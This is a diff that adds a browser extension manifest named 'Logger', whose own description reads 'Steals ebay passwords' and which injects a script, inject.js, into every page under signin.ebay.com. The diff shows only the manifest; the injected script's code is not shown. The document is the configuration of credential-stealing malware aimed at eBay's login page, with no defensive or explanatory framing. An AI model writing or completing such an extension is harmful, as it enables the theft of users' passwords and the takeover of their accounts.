@@ -1,0 +1,12 @@
+{
+  "manifest_version": 2,
+  "name": "Logger",
+  "description": "Steals ebay passwords",
+  "version": "1.0",
+  "content_scripts": [
+    {
+      "matches": ["https://signin.ebay.com/*"],
+      "js": ["inject.js"]
+    }
+  ]
+}
